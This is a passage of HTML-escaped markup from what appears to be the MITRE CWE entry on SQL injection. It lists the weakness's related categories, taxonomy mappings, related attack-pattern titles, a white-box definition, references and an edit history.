target="_blank"&gt;Improper Sanitization of Special Elements used in a Command ('Command Injection')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;713&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=713" target="_blank"&gt;OWASP Top Ten 2007 Category A2 - Injection Flaws&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2007) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;629&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;722&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=722" target="_blank"&gt;OWASP Top Ten 2004 Category A1 - Unvalidated Input&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004)&lt;/span&gt;711&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;727&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=727" target="_blank"&gt;OWASP Top Ten 2004 Category A6 - Injection Flaws&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;751&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=751" target="_blank"&gt;2009 Top 25 - Insecure Interaction Between Components&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in the 2009 CWE/SANS Top 25 Most Dangerous Programming Errors &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;750&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;801&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=801" target="_blank"&gt;2010 Top 25 - Insecure Interaction Between Components&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in the 2010 CWE/SANS Top 25 Most Dangerous Programming Errors &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;800&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;564&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=564" target="_blank"&gt;SQL Injection: Hibernate&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;MemberOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;630&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=630" target="_blank"&gt;Weaknesses Examined by SAMATE&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses Examined by SAMATE &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;630&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;MemberOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;635&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=635" target="_blank"&gt;Weaknesses Used by NVD&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses Used by NVD &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;635&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;CanFollow&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;456&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=456" target="_blank"&gt;Missing Initialization&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationship Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationship Notes&lt;/div&gt;&lt;div name="oc_89_Relationship Notes" id="oc_89_Relationship Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;SQL injection can be resultant from special character mismanagement, MAID,
or blacklist/whitelist problems. It can be primary to authentication
errors.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_89_Taxonomy Mappings" id="oc_89_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;SQL injection&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;SQL Injection&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;CLASP&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;SQL injection&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;OWASP Top Ten 2007&lt;/td&gt;&lt;td valign="top"&gt;A2&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE More Specific&lt;/td&gt;&lt;td valign="top"&gt;Injection Flaws&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;OWASP Top Ten 2004&lt;/td&gt;&lt;td valign="top"&gt;A1&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE More Specific&lt;/td&gt;&lt;td valign="top"&gt;Unvalidated Input&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;OWASP Top Ten 2004&lt;/td&gt;&lt;td valign="top"&gt;A6&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE More Specific&lt;/td&gt;&lt;td valign="top"&gt;Injection Flaws&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;WASC&lt;/td&gt;&lt;td valign="top"&gt;19&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;SQL Injection &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Related Attack Patterns"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Related Attack Patterns&lt;/div&gt;&lt;div name="oc_89_Related Attack Patterns" id="oc_89_Related Attack Patterns" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;CAPEC-ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Attack Pattern Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;&lt;div style="font-weight:normal; font-size:85%; font-style:italic; color:#000000"&gt;(CAPEC Version: 1.5)&lt;/div&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org7.html" target="_blank"&gt;7&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Blind SQL Injection&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org66.html" target="_blank"&gt;66&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;SQL Injection&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org108.html" target="_blank"&gt;108&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Command Line Execution through SQL Injection&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org109.html" target="_blank"&gt;109&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Object Relational Mapping Injection&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org110.html" target="_blank"&gt;110&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;SQL Injection through SOAP Parameter Tampering&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="White Box Definitions"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;White Box Definitions&lt;/div&gt;&lt;div name="oc_89_White Box Definitions" id="oc_89_White Box Definitions" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;A weakness where the code path has:&lt;/p&gt;
&lt;div class="indent "&gt;
&lt;p&gt;1. start statement that accepts input and&lt;/p&gt;
&lt;p&gt;2. end statement that performs an SQL command where&lt;/p&gt;
&lt;div class="indent "&gt;
&lt;p&gt;a. the input is part of the SQL command and&lt;/p&gt;
&lt;p&gt;b. input contains SQL syntax (esp. query separator)&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="References"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;References&lt;/div&gt;&lt;div name="oc_89_References" id="oc_89_References" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;[REF-17] Michael Howard, David LeBlanc
and John Viega. "24 Deadly Sins of Software Security". "Sin 1: SQL Injection." Page 3. McGraw-Hill. 2010. &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;[REF-11] M. Howard and
D. LeBlanc. "Writing Secure Code". Chapter 12, "Database Input Issues" Page
397. 2nd Edition. Microsoft. 2002. &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;OWASP. "SQL Injection Prevention Cheat Sheet". &amp;lt;&lt;a href="http://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet" target="_blank"&gt;http://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Steven Friedl. "SQL Injection Attacks by Example". 2007-10-10. &amp;lt;&lt;a href="http://www.unixwiz.net/techtips/sql-injection.html" target="_blank"&gt;http://www.unixwiz.net/techtips/sql-injection.html&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Ferruh Mavituna. "SQL Injection Cheat Sheet". 2007-03-15. &amp;lt;&lt;a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/" target="_blank"&gt;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;David Litchfield, Chris Anley, John Heasman
and Bill Grindlay. "The Database Hacker's Handbook: Defending Database
Servers". Wiley. 2005-07-14. &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;David Litchfield. "The Oracle Hacker's Handbook: Hacking and Defending
Oracle". Wiley. 2007-01-30. &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Microsoft. "SQL Injection". December 2008. &amp;lt;&lt;a href="http://msdn.microsoft.com/en-us/library/ms161953.aspx" target="_blank"&gt;http://msdn.microsoft.com/en-us/library/ms161953.aspx&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Microsoft Security Vulnerability Research &amp;amp;
Defense. "SQL Injection Attack". &amp;lt;&lt;a href="http://blogs.technet.com/swi/archive/2008/05/29/sql-injection-attack.aspx" target="_blank"&gt;http://blogs.technet.com/swi/archive/2008/05/29/sql-injection-attack.aspx&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Michael Howard. "Giving SQL Injection the Respect it Deserves". 2008-05-15. &amp;lt;&lt;a href="http://blogs.msdn.com/sdl/archive/2008/05/15/giving-sql-injection-the-respect-it-deserves.aspx" target="_blank"&gt;http://blogs.msdn.com/sdl/archive/2008/05/15/giving-sql-injection-the-respect-it-deserves.aspx&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_89_Content History" id="oc_89_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CLASP&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-08-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;KDM Analytics&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;added/updated white box definitions&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-08-15&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Veracode&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;Suggested OWASP Top Ten 2004
mapping&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Applicable Platforms, Common Consequences,
Modes of Introduction, Name, Relationships, Other Notes, Relationship Notes,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-10-14&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-11-24&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Observed Examples&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-01-12&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Examples, Description,
Enabling Factors for Exploitation, Modes of Introduction, Name,
Observed Examples, Other Notes, Potential Mitigations, References,
Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-03-10&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-05-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Examples, Name,
Related Attack Patterns&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-07-17&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;KDM Analytics&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;Improved the White Box Definition&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-07-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Name,
White Box Definitions&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-12-28&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2010-02-16&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Examples, Detection Factors,
Potential Mitigations, References, Relationships,
